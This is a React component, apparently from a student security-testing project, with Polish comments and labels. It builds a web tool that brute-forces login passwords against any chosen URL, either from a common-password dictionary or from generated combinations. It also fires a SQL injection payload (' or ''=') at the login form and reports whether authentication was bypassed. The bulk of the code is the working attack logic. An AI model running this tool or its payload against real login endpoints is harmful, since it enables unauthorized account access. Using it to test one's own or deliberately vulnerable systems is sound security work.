import React, {useState} from 'react';
import axios from "axios";
import {
    CheckBoxWrapper,
    ColumnWrapper,
    FormContainer,
    GreenLabel,
    InputWrapper,
    PageTitle,
    RedLabel,
    SectionTitle,
    SQLInputWrapper,
    StyledContainer
} from "./AuthenticationTests.styles";
import {Alert, Button, Checkbox, MenuItem, Select, TextField, ThemeProvider} from "@mui/material";
import {generate} from "brute-force-generator";
import {createTheme} from "@mui/material/styles";
import { commonPasswords } from "../../helpers/commonPasswords";

/**
 *
 * @param bruteForceChars - są to znaki, z których budowane będzie hasło.
 * Przekazywane są jako string, rozdzielane przecinkiem.
 * @param bruteForceLength - jest to liczba, wskazuje ona maksymalną długość wygenerowanych haseł
 * @returns {*[]} - jest to tablica String, przechowuje wygenerowane hasła
 */
export const generatePasswords = (bruteForceChars, bruteForceLength) => {
    const chars = bruteForceChars.split(',');
    const gen = generate(chars, bruteForceLength);
    const passwordsArr = [];
    for (let record of gen) {
        passwordsArr.push(record);
    }
    return passwordsArr;
}

/**
 *
 * @param url - adres url do endpointu logowania
 * @param login - nazwa użytkownika
 * @param password - hasło użytkownika
 * @returns {Promise<AxiosResponse<any>|undefined>} - odpowiedź serwera
 */
export const login = async (url, login, password) => {
    try {
        return await axios.post(url, {
            login,
            password,
        });
    } catch (err) {
        return undefined
    }
};

const AuthenticationTests = props => {
    const [pageUrl, setPageUrl] = useState('http://localhost:8080/login');
    const [login, setLogin] = useState('');
    const [passwordFound, setPasswordFound] = useState(null);
    const [searchTime, setSearchTime] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [isLoadingSQL, setIsLoadingSQL] = useState(false);
    const [sqlInjectionStatus, setSqlInjectionStatus] = useState(null);
    const [sqlInjectionError, setSqlInjectionError] = useState(null);
    const [sqlCommand, setSqlCommand] = useState("' or ''='");
    const [userNameFieldName, setUserNameFieldName] = useState('username');
    const [passwordFieldName, setPasswordFieldName] = useState('password');
    const [bruteForceChars, setBruteForceChars] = useState('d,a,w,i');
    const [bruteForceLength, setBruteForceLength] = useState(5);
    const [usePasswordGenerator, setUsePasswordGenerator] = useState(false);
    const [passwordToAdd, setPasswordToAdd] = useState('');
    const [passwordExistsAlert, setPasswordExistsAlert] = useState(false);

    /**
     * Predefiniowany zbiór haseł, który może zostać uzupełniony o więcej haseł.
     */
    const [passwords, setPasswords] = useState(commonPasswords);

    const theme = createTheme({
        palette: {
            mode: 'light',
        },
    });

    /**
     * Metoda odpowiedzialna za wybór między metodą słownikową a bruteforce, wyszukanie hasła do konta i
     * wyświetlenie go.
     */
    const loginToSystem = () => {
        setPasswordFound(null);
        setIsLoading(true);
        let start = performance.now();

        let combinations = null;

        let keepSeeking = true;

        if (usePasswordGenerator) {
            combinations = generatePasswords(bruteForceChars, bruteForceLength);
        } else {
            combinations = passwords;
        }

        for (let passwd of combinations) {
            if (keepSeeking) {
                axios.post(`${pageUrl}`, {
                    [userNameFieldName]: login,
                    [passwordFieldName]: passwd
                }).then(res => {
                    if (res.status === 200) {
                        let end = performance.now();
                        console.log(res.status)
                        setPasswordFound(passwd);
                        setSearchTime(end - start);
                        setIsLoading(false);
                        keepSeeking = false;
                    }
                })
            }
        }
    }

    /**
     * Metoda odpowiedzialna za dokonanie ataku typu SQL Injection
     */
    const sqlInjection = () => {
        setSqlInjectionStatus(null);
        setSqlInjectionError(null);
        setIsLoadingSQL(true);
        axios.post(`${pageUrl}`, {
            [userNameFieldName]: login,
            [passwordFieldName]: sqlCommand
        }).then(res => {
            if (res.status === 200) {
                setSqlInjectionStatus(`Udało się zalogować za pomocą SQL Injection ${JSON.stringify(res.data)}`)
            }
        }).catch(err => {
            if (err) {
                setSqlInjectionError('Nie udało się wstrzyknąć SQL!')
            }
        }).finally(() => setIsLoadingSQL(false))
    }

    /**
     * Metoda odpowiedzialna za dodanie hasła do słownika
     */
    function handleAddPasswordToList() {
        if (passwords.includes(passwordToAdd)) {
            setPasswordExistsAlert(true);
        } else {
            setPasswords(pass => [...pass, passwordToAdd]);
        }
        setPasswordToAdd('');
    }


    /**
     * Wyświetlenie formularza
     */
    return (
        <ThemeProvider theme={theme}>
            <StyledContainer>
                <FormContainer>
                    <PageTitle>Brute Force & SQL Injection</PageTitle>
                    <SectionTitle>Znajdź hasło metodą Brute Force</SectionTitle>
                    <span>Wybierz API lub wpisz własne:</span>
                    <Select style={{width: '70%', borderColor: '#000'}} label={'Wybierz api'} value={pageUrl}
                            onChange={(item) => setPageUrl(item.target.value)}>
                        <MenuItem value={"https://node-app-4fun.herokuapp.com/users/login"}>Chronione Api</MenuItem>
                        <MenuItem value={"http://localhost:8080/login"}>Nie chronione Api</MenuItem>
                    </Select>
                    <span style={{marginTop: 12, marginBottom: 12}}>Użyj generatora haseł lub skorzystaj ze słownika</span>
                    {passwordExistsAlert && (
                        <Alert severity={'error'} onClick={() => setPasswordExistsAlert(false)}>
                            Podane hasło już istnieje w słowniku!
                        </Alert>
                    )}
                    <CheckBoxWrapper>
                        <Checkbox
                            checked={usePasswordGenerator}
                            onChange={() => setUsePasswordGenerator(!usePasswordGenerator)}
                        />
                        {usePasswordGenerator ? (
                            <ColumnWrapper>
                                <TextField
                                    onChange={e => setBruteForceChars(e.target.value)}
                                    value={bruteForceChars}
                                    label={'Podaj znaki po przecinku'}
                                    style={{ marginBottom: 10 }}
                                />
                                <TextField
                                    onChange={e => setBruteForceLength(e.target.value)}
                                    value={bruteForceLength}
                                    label={'Podaj max długość hasła'}
                                    type={'number'}
                                />
                            </ColumnWrapper>
                        ) : (
                            <>
                                <TextField
                                    label={'Dodaj hasło do słownika'}
                                    value={passwordToAdd}
                                    onChange={e => setPasswordToAdd(e.target.value)}
                                />
                                <Button
                                    disabled={false}
                                    size={'large'}
                                    variant={'contained'}
                                    style={{ marginLeft: 10 }}
                                    onClick={() => handleAddPasswordToList()}
                                >
                                    Dodaj
                                </Button>
                            </>
                        )}
                    </CheckBoxWrapper>

                    <InputWrapper>
                        <TextField
                            fullWidth
                            label="Podaj API Url logowania na stronie"
                            value={pageUrl}
                            onChange={e => setPageUrl(e.target.value)}
                        />
                    </InputWrapper>
                    <InputWrapper>
                        <TextField
                            fullWidth
                            label="Podaj login / e-mail konta"
                            value={login}
                            onChange={e => setLogin(e.target.value)}
                        />
                    </InputWrapper>
                    <InputWrapper>
                        <TextField
                            fullWidth
                            label="Podaj nazwę pola login/e-mail"
                            value={userNameFieldName}
                            onChange={e => setUserNameFieldName(e.target.value)}
                        />
                    </InputWrapper>
                    <InputWrapper>
                        <TextField
                            fullWidth
                            label="Podaj nazwę pola hasła"
                            value={passwordFieldName}
                            onChange={e => setPasswordFieldName(e.target.value)}
                        />
                    </InputWrapper>
                    <InputWrapper>
                        {isLoading ? (
                            <span>Proszę czekać ...</span>
                        ) : (
                            <Button
                                id={'findPasswordBtn'}
                                size={'large'}
                                variant={'contained'}
                                disabled={login === ''}
                                onClick={() => loginToSystem()}>
                                Znajdź hasło
                            </Button>
                        )}
                    </InputWrapper>
                    {passwordFound && (
                        <GreenLabel>Znalezione hasło: {passwordFound}</GreenLabel>
                    )}
                    {searchTime && (
                        <span>czas wyszukiwania: {(searchTime / 1000).toFixed(2)} sekund</span>
                    )}
                    <SQLInputWrapper>
                        <SectionTitle>Sprawdzanie podatności na ataki SQL Injection</SectionTitle>
                        <TextField
                            fullWidth
                            label="Komenda SQL"
                            value={sqlCommand}
                            onChange={e => setSqlCommand(e.target.value)}
                        />
                    </SQLInputWrapper>
                    <InputWrapper>
                        {isLoadingSQL ? (
                            <span>Proszę czekać ...</span>
                        ) : (
                            <Button
                                size={'large'}
                                variant={'contained'}
                                onClick={() => sqlInjection()}>
                                SQL Injection
                            </Button>
                        )}
                        {sqlInjectionStatus && (
                            <GreenLabel>{sqlInjectionStatus}</GreenLabel>
                        )}
                        {sqlInjectionError && (
                            <RedLabel>{sqlInjectionError}</RedLabel>
                        )}
                    </InputWrapper>
                </FormContainer>
            </StyledContainer>
        </ThemeProvider>
    );
};

export default AuthenticationTests;
